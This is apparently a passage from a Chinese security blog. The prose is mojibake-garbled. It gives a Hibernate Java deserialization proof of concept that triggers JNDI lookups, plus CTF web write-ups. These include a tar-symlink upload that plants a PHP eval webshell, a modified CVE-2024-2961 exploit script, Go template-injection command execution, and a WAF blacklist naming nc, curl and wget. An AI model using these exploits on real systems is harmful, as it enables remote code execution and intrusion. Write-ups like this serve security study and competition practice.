setFieldValue(basicGetter, \u0026#34;clazz\u0026#34;, jdbcRowSet.getClass()); setFieldValue(basicGetter, \u0026#34;propertyName\u0026#34;, \u0026#34;databaseMetaData\u0026#34;); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{basicGetter}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,jdbcRowSet); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } æ‰“jndiæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå°è¯•æ„é€ hibernate\u0026gt;=5ä¸‹çš„æ‰“connect()æ–¹æ³•çš„pocï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.rowset.JdbcRowSetImpl; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //å®šä¹‰æ¶æ„çš„å­—èŠ‚ç  JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, jdbcRowSet.getClass().getDeclaredMethod(\u0026#34;connect\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,jdbcRowSet); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } ä¹Ÿæ˜¯æˆåŠŸæ‰“jndiä»è€Œå¼¹å‡ºè®¡ç®—æœºï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\næ€»ç»“ æœ€æœ‰æ„æ€çš„å°±æ˜¯äº†è§£åˆ°äº†ReflectionFactoryç±»çš„ä½¿ç”¨ï¼Œç¡®å®å¥½ç”¨ï¼Œå¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªjavaå¯¹è±¡ä¸ç®¡å…¶æ„é€ æ–¹æ³•ï¼Œä»¥åå¤šæ³¨æ„æ€è€ƒåˆ©ç”¨ã€‚ å‚è€ƒæ–‡ç« ï¼š\nhttps://zhuanlan.zhihu.com/p/158978955\nhttps://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#hibernate2\n","date":"2025-09-19T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"hibernateç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´"},{"content":"WEB æ–‡æ›²ç­¾å­¦ å¼€é¢˜å‰ç«¯æœ‰æç¤ºï¼š\nåœ¨å‰ç«¯é¡µé¢çš„jsä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼š\né•¿æŒ‰fnæ¿€æ´»ï¼š\nç„¶åé€šè¿‡æç¤ºè¾“å…¥#helpï¼š\nå¯ä»¥çœ‹åˆ—è¡¨å¹¶è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¤šæ¬¡å°è¯•è¯»å–ï¼Œæœ€ååŒå†™ç»•è¿‡../å†è¯»flagå³å¯ï¼š\n1 #read â€¦/./â€¦/./â€¦/./â€¦/./flag flagå¦‚ä¸‹ï¼š\n1 flag{18d8f6bc-50ef-4ca2-af72-cdc3e6e76391} EZ_upload EZ_upload?\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\néšä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶å³å¯æ‹¿åˆ°æ–‡ä»¶æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php highlight_file(__FILE__); function handleFileUpload($file) { $uploadDirectory = \u0026#39;/tmp/\u0026#39;; if ($file[\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) { echo \u0026#39;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ã€‚\u0026#39;; return; } $filename = basename($file[\u0026#39;name\u0026#39;]); $filename = preg_replace(\u0026#39;/[^a-zA-Z0-9_\\-\\.]/\u0026#39;, \u0026#39;_\u0026#39;, $filename); if (empty($filename)) { echo \u0026#39;æ–‡ä»¶åä¸ç¬¦åˆè¦æ±‚ã€‚\u0026#39;; return; } $destination = $uploadDirectory . $filename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; tar -xvf \u0026#39; . $filename.\u0026#39;\u0026amp;\u0026amp;pwd\u0026#39;); echo $destination; } else { echo \u0026#39;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚\u0026#39;; } } handleFileUpload($_FILES[\u0026#39;file\u0026#39;]); ?\u0026gt; é€šè¯»ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºæœ€é‡è¦çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 $destination = $uploadDirectory . $filename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; tar -xvf \u0026#39; . $filename.\u0026#39;\u0026amp;\u0026amp;pwd\u0026#39;); echo $destination; } else { echo \u0026#39;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚\u0026#39;; } æœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ“ä½œï¼Œæœ€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯æ“æ§æ–‡ä»¶åæ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œå¹¶ä¸”ä½œäº†wafæ¥è¿›è¡Œç›¸åº”çš„é™åˆ¶ã€‚åé¢çœ‹åˆ°execä¸­æ‰§è¡Œäº†tarè§£å‹çš„å‘½ä»¤ï¼Œå‹ç¼©åŒ…ï¼Œè½¯é“¾æ¥è€ƒçƒ‚äº†ï¼Œè‡ªç„¶æƒ³åˆ°è¿™ä¸ªæ‰“æ³•ã€‚\nå…³äºå‹ç¼©åŒ…è½¯é“¾æ¥çš„æ‰“æ³•ï¼Œéå¸¸ç»å…¸çš„æ‰“æ³•å¯ä»¥å‚è€ƒå¦‚ä¸‹wpï¼š\nhttps://www.cnblogs.com/gxngxngxn/p/17439035.html\nå¹¶ä¸”ä»£ç éƒ½æ˜¯å·®ä¸å¤šçš„ï¼š\n1 exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); ç®€å•æ¥è¯´å°±æ˜¯ä¸Šä¼ ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œç¬¬ä¸€ä¸ªåˆ›å»ºä¸€ä¸ªæŒ‡å‘/var/www/htmlç›®å½•ä¸‹çš„è½¯é“¾æ¥ï¼Œç¬¬äºŒä¸ªå°±ä¼šè§£å‹åˆ°è½¯é“¾æ¥å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œå¦‚ä¸‹æ‰“å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 ln -s /var/www/html mylink tar -cvhf archive.tar mylink rm -rf ./* mkdir mylink cd mylink vim shell.php (\u0026lt;?php @eval($_POST[123]);?\u0026gt;) cd .. tar -cvhf archive.tar mylink/shell.php ç„¶åå…ˆä¸Šä¼ ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„archive.tarï¼Œå†ä¸Šä¼ ç¬¬äºŒæ¬¡ç”Ÿæˆçš„archive.taræ–‡ä»¶ï¼Œç„¶åè®¿é—®shell.phpå³å¯ï¼š\nflagå¦‚ä¸‹ï¼š\n1 flag{a91443eb-28c4-4eff-8b9a-a6b515b75633} â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nSeRce // è¿™æ˜¯ä¸€æ®µæå…¶å®‰å…¨çš„ä»£ç  - æ¥è‡ªæŸä¸ªå¼€å‘è€…çš„æ³¨é‡Š\n\u0026hellip;\nï¼ˆä¸‰åˆ†é’Ÿåï¼‰\n\u0026hellip;\nå¥½å§ï¼Œçœ‹æ¥æ³¨é‡Šéœ€è¦æ›´æ–°äº†ã€‚ä½ çš„ä»»åŠ¡ï¼šè®©è¿™æ®µä»£ç åšä¸€ä»¶å®ƒâ€˜ç»å¯¹ä¸è¯¥åšâ€™çš„äº‹æƒ…â€”â€”æŠŠ /flag çš„å†…å®¹åå‡ºæ¥ã€‚ç¥ä½ å¥½è¿ï¼\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå¼€é¢˜ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;?php highlight_file(__FILE__); $exp = $_GET[\u0026#34;exp\u0026#34;]; if(isset($exp)){ if(serialize(unserialize($exp)) != $exp){ $data = file_get_contents($_POST[\u0026#39;filetoread\u0026#39;]); echo \u0026#34;File Contents: $data\u0026#34;; } } éå¸¸ç®€å•çš„ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºéœ€è¦ååºåˆ—åŒ–åå†åºåˆ—åŒ–çš„æ•°æ®æ˜¯ä¸åŒçš„ï¼Œç„¶åæœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œç¬¬ä¸€ä¸ªwafï¼Œæƒ³åˆ°äº†å­—ç¬¦ä¸²é€ƒé€¸çš„å¢å¤šçš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å½“æ­£å¸¸åŒ¹é…åˆ°å®Œæ•´çš„ååºåˆ—åŒ–æ•°æ®ï¼Œåé¢çš„å†…å®¹å°±ä¼šè¢«èˆå¼ƒï¼Œè®©aiç»™å‡ºä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç„¶ååŠ ä¸Šä¸€äº›å…¶ä»–æ•°æ®å³å¯ï¼š\nä½†æ˜¯ç›´æ¥è¯»flagä¹Ÿè¯»ä¸å‡ºæ¥ï¼Œå†çœ‹è¿™é‡Œçš„File Contents: çš„å›æ˜¾ï¼Œéå¸¸å®¹æ˜“æƒ³åˆ°CVE-2024-2961çš„æ‰“æ³•ï¼Œä¹Ÿæ˜¯éå¸¸å¸¸è§çš„è€ƒç‚¹äº†ï¼Œç»“åˆé¢˜ç›®æè¿°çŒœæµ‹æ˜¯éœ€è¦ææƒã€‚æœ€å¼€å§‹æ‰“çš„kezibeiçš„æœ¬åœ°åŒ–é¡¹ç›®æ¥å†™æ–‡ä»¶ï¼Œæ²¡æˆåŠŸï¼Œç„¶åè¿˜æ˜¯æ”¹çš„æœ€å¼€å§‹ç»™å‡ºçš„è„šæœ¬ï¼š\nhttps://github.com/ambionics/cnext-exploits\nå†™æ–‡ä»¶è¿˜æ˜¯æ²¡æˆåŠŸï¼Œåé¢ä¸€æƒ³ï¼Œæ˜¯ä¸æ˜¯æƒé™ä¸å¤Ÿï¼Œé‚£ä¹ˆæˆ‘å°±å†™å›æ˜¾åˆ°/tmpç›®å½•ä¸‹ï¼Œç„¶åå†è¯»è¿™ä¸ªæ–‡ä»¶å†…å®¹ï¼š\nä¿®æ”¹çš„å…³é”®çš„pythonè„šæœ¬çš„å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; return self.session.post(self.url, data={\u0026#34;filetoread\u0026#34;: path},params={\u0026#34;exp\u0026#34;:\u0026#39;O:1:\u0026#34;X\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;test\u0026#34;;}111\u0026#39;}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) m = re.search(b\u0026#34;File Contents: (.*)\u0026#34;, response.content, flags=re.S) if m: data = m.group(1) print(data) else: print(\u0026#34;åŒ¹é…ä¸åˆ°\u0026#34;) return base64.decode(data) ç„¶åå°†å…¶è¿è¡Œè„šæœ¬ï¼š\n1 python3 1.py https://eci-2ze5f0zlgsjhwokxvmcd.cloudeci1.ichunqiu.com:80/ \u0026#34;/readflag \u0026gt; /tmp/2.txt\u0026#34; å¯ä»¥æ‰“æˆåŠŸã€‚åœ¨è¿™é‡Œæˆ‘æ˜¯å…ˆls /çœ‹åˆ°readflagï¼Œé‚£ä¹ˆå°±æ˜¯è¦å¦‚ä¸Šå‘½ä»¤æ‰§è¡Œäº†ï¼Œéšåå¯ä»¥æ‹¿åˆ°flagï¼š\nflagå¦‚ä¸‹ï¼š\n1 flag{41483f84-343f-4976-b94f-808dd785b475} â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n","date":"2025-09-14T17:05:27+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%BA%94%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/","title":"ç¬¬äº”å±Šâ€œé•¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›WEBé¢˜è§£"},{"content":"WEB é¢˜ç›®è´¨é‡ä¸€èˆ¬ã€‚\nssti æ¨¡æ¿æ³¨å…¥\nâ€”â€”â€”â€”â€”â€”â€”â€”\ngoè¯­è¨€çš„sstiï¼Œå‚è€ƒå¦‚ä¸‹çš„æ–‡ç« ç›´æ¥æ‰“å°±è¡Œï¼š\nhttps://xz.aliyun.com/news/15003\nå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š\nå¯ä»¥è¯»åˆ°æ ¹ç›®å½•ï¼š\n1 2 app boot etc\tgo lib media opt root sbin sys usr bin dev flag home lib64 mnt proc run\tsrv tmp var æœ‰flagï¼Œä½†æ˜¯åé¢å°è¯•å¾ˆå¤špayloadéƒ½æ²¡æœ‰æˆåŠŸèµ·ä½œç”¨ï¼Œåˆç†çŒœæµ‹åç«¯æ˜¯åŠ äº†wafçš„ï¼Œé‚£ä¹ˆå°±å…ˆè¯»å–main.goè¿è¡Œæ–‡ä»¶ï¼š\n1 {{ exec \u0026#34;nl main.go\u0026#34; }} æ‹¿åˆ°å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;regexp\u0026#34; \u0026#34;runtime\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;text/template\u0026#34; ) func execCommand(command string) string { var cmd *exec.Cmd if runtime.GOOS == \u0026#34;windows\u0026#34; { cmd = exec.Command(\u0026#34;cmd\u0026#34;, \u0026#34;/c\u0026#34;, command) } else { cmd = exec.Command(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, command) } var out bytes.Buffer var stderr bytes.Buffer cmd.Stdout = \u0026amp;out cmd.Stderr = \u0026amp;stderr err := cmd.Run() if err != nil { if stderr.Len() \u0026gt; 0 { return fmt.Sprintf(\u0026#34;å‘½ä»¤æ‰§è¡Œé”™è¯¯: %s\u0026#34;, stderr.String()) } return fmt.Sprintf(\u0026#34;æ‰§è¡Œå¤±è´¥: %v\u0026#34;, err) } return out.String() } func b64Decode(encoded string) string { decodedBytes, err := base64.StdEncoding.DecodeString(encoded) if err != nil { return \u0026#34;error\u0026#34; } return string(decodedBytes) } func aWAF(next http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \u0026#34;/api\u0026#34; { next.ServeHTTP(w, r) return } query := r.URL.Query().Get(\u0026#34;template\u0026#34;) if query == \u0026#34;\u0026#34; { next.ServeHTTP(w, r) return } blacklist := []string{ \u0026#34;ls\u0026#34;, \u0026#34;whoami\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;uname\u0026#34;, \u0026#34;nc\u0026#34;, \u0026#34;flag\u0026#34;, \u0026#34;etc\u0026#34;, \u0026#34;passwd\u0026#34;, \u0026#34;\\\\*\u0026#34;, \u0026#34;pwd\u0026#34;, \u0026#34;rm\u0026#34;, \u0026#34;cp\u0026#34;, \u0026#34;mv\u0026#34;, \u0026#34;chmod\u0026#34;, \u0026#34;chown\u0026#34;, \u0026#34;wget\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;python\u0026#34;, \u0026#34;perl\u0026#34;, \u0026#34;ruby\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;less\u0026#34;, \u0026#34;more\u0026#34;, \u0026#34;find\u0026#34;, \u0026#34;grep\u0026#34;, \u0026#34;awk\u0026#34;, \u0026#34;sed\u0026#34;, \u0026#34;tar\u0026#34;, \u0026#34;zip\u0026#34;, \u0026#34;unzip\u0026#34;, \u0026#34;gzip\u0026#34;, \u0026#34;gunzip\u0026#34;, \u0026#34;bzip2\u0026#34;, \u0026#34;bunzip2\u0026#34;, \u0026#34;xz\u0026#34;, \u0026#34;unxz\u0026#34;, \u0026#34;docker\u0026#34;, \u0026#34;kubectl\u0026#34;, \u0026#34;git\u0026#34;, \u0026#34;svn\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;\\\\?\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;\\\\|\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;\\\\(\u0026#34;, \u0026#34;\\\\)\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\\\\\\\\\u0026#34;, \u0026#34;\\\\^\u0026#34;, \u0026#34;\\\\$\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, } escaped := make([]string, len(blacklist)) for i, item := range blacklist { escaped[i] = \u0026#34;\\\\b\u0026#34; + item + \u0026#34;\\\\b\u0026#34; } wafRegex := regexp.MustCompile(fmt.Sprintf(\u0026#34;(?i)%s\u0026#34;, strings.Join(escaped, \u0026#34;|\u0026#34;))) if wafRegex.MatchString(query) { http.Error(w, query, 200) return } next.ServeHTTP(w, r) }) } func apiHandler(w http.ResponseWriter, r *http.Request) { query := r.URL.Query().Get(\u0026#34;template\u0026#34;) if query == \u0026#34;\u0026#34; { http.Error(w, \u0026#34;éœ€è¦templateå‚æ•°\u0026#34;, http.StatusBadRequest) return } funcMap := template.FuncMap{ \u0026#34;exec\u0026#34;: execCommand, \u0026#34;B64Decode\u0026#34;: b64Decode, } tmpl, err := template.New(\u0026#34;api\u0026#34;).Funcs(funcMap).Parse(query) if err != nil { http.Error(w, query, http.StatusAccepted) return } var buf bytes.Buffer if err := tmpl.Execute(\u0026amp;buf, funcMap); err != nil { http.Error(w, query, http.StatusAccepted) return } w.Write(buf.Bytes()) } func rootHandler(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \u0026#34;/\u0026#34; { http.NotFound(w, r) return } http.ServeFile(w, r, \u0026#34;index.html\u0026#34;) } func main() { mux := http.NewServeMux() mux.HandleFunc(\u0026#34;/\u0026#34;, rootHandler) mux.HandleFunc(\u0026#34;/api\u0026#34;, apiHandler) log.Println(\u0026#34;æœåŠ¡å™¨å¯åŠ¨åœ¨ :80\u0026#34;) log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, aWAF(mux))) } æ‹¿åˆ°é»‘åå•ï¼Œæ‰€ä»¥ç›´æ¥å¦‚ä¸‹è¯»å–å³å¯ï¼š\n1 {{ exec \u0026#34;nl /??a?\u0026#34; }} å³å¯æ‹¿åˆ°flag:\nflagå¦‚ä¸‹ï¼š\n1 flag{5cAfgGx3Nd4KPr5aXkYTjeu704U9WDAu} easy_readfile å¼ºå¼ºå¼º\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nphpååºåˆ—åŒ–çš„é¢˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026lt;?php highlight_file(__FILE__); function waf($data){ if (is_array($data)){ die(\u0026#34;Cannot transfer arrays\u0026#34;); } if (preg_match(\u0026#39;/\u0026lt;\\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;You can\u0026#39;t do\u0026#34;); } } class Coral{ public $pivot; public function __set($k, $value) { $k = $this-\u0026gt;pivot-\u0026gt;ctor; echo new $k($value); } } class Nimbus{ public $handle; public $ctor; public function __destruct() { return $this-\u0026gt;handle(); } public function __call($name, $arg){ $arg[1] = $this-\u0026gt;handle-\u0026gt;$name; } } class Zephyr{ public $target; public $payload; public function __get($prop) { $this-\u0026gt;target-\u0026gt;$prop = $this-\u0026gt;payload; } } class Acheron { public $mode; public function __destruct(){ $data = $_POST[0]; if ($this-\u0026gt;mode == \u0026#39;w\u0026#39;) { waf($data); $filename = \u0026#34;/tmp/\u0026#34;.md5(rand()).\u0026#34;.phar\u0026#34;; file_put_contents($filename, $data); echo $filename; } else if ($this-\u0026gt;mode == \u0026#39;r\u0026#39;) { waf($data); $f = include($data); if($f){ echo \u0026#34;It is file\u0026#34;; } else{ echo \u0026#34;You can look at the others\u0026#34;; } } } } if(strlen($_POST[1]) \u0026lt; 52) { $a = unserialize($_POST[1]); } else{ echo \u0026#34;str too long\u0026#34;; } ?\u0026gt; ä¸€çœ‹wafç¦äº†å¾ˆå¤šï¼Œå†çœ‹å¯ä»¥å†™æ–‡ä»¶å¹¶ä¸”å¼ºåˆ¶æ–‡ä»¶åç¼€ä¸ºpharï¼Œå†çœ‹æœ‰ä¸€ä¸ªinclude()æ–‡ä»¶åŒ…å«ï¼ŒåŸºæœ¬å°±å¯ä»¥æ•²å®šè€ƒç‚¹æ˜¯æœ€è¿‘å‘çš„includeçš„trickï¼Œå°±æ˜¯å¦‚æœè¦åŒ…å«çš„æ–‡ä»¶çš„æ–‡ä»¶ååŒ…å«.pharï¼Œé‚£ä¹ˆä¼šè‡ªåŠ¨å¯¹è¿™ä¸ªæ–‡ä»¶è§£å‹ä¸€æ¬¡åœ¨è¿›è¡Œå¸¸è§„çš„æ–‡ä»¶åŒ…å«æ“ä½œï¼Œæ“ä½œè¿‡ç¨‹å’Œåˆ†ææ–‡ç« ç½‘ä¸Šéƒ½æœ‰ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\næ‰€ä»¥è¿™é‡Œçš„æ€è·¯å°±æ˜¯ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ç„¶åå‹ç¼©ï¼Œå†åœ¨å¯¹Acheronç±»ååºåˆ—åŒ–æ—¶è®¾ç½®æ¨¡å¼ä¸ºwæ¥å†™å…¥æ–‡ä»¶ï¼Œç„¶åå†è®¾ç½®æ¨¡å¼ä¸ºræ¥åŒ…å«å†™ä¸Šå»çš„æ–‡ä»¶ã€‚\næœ€å¼€å§‹æ²¡æ³¨æ„åˆ°è¿™é‡Œechoäº†æ–‡ä»¶åï¼Œè¿˜æ‰¾äº†ä¸€ä¸‹é“¾å­ç”¨åŸç”Ÿç±»æ¥åˆ—æ–‡ä»¶åï¼Œé“¾å­å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 $a = new Nimbus(); $a-\u0026gt;handle=new Zephyr(); $a-\u0026gt;handle-\u0026gt;target=new Coral(); $a-\u0026gt;handle-\u0026gt;payload=\u0026#34;/tmp/*\u0026#34;; $a-\u0026gt;handle-\u0026gt;target-\u0026gt;pivot=new Nimbus(); $a-\u0026gt;handle-\u0026gt;target-\u0026gt;pivot-\u0026gt;ctor=\u0026#34;GlobIterator\u0026#34;; unserialize(serialize($a)); åé¢åœ¨æ“è„šæœ¬å‘ç°å›æ˜¾äº†å†™å…¥çš„æ–‡ä»¶åï¼Œé‚ç›´æ¥æ”¾å¼ƒäº†è¿™ä¸ªæƒ³æ³•ï¼ˆä½†æ˜¯è¿™æ 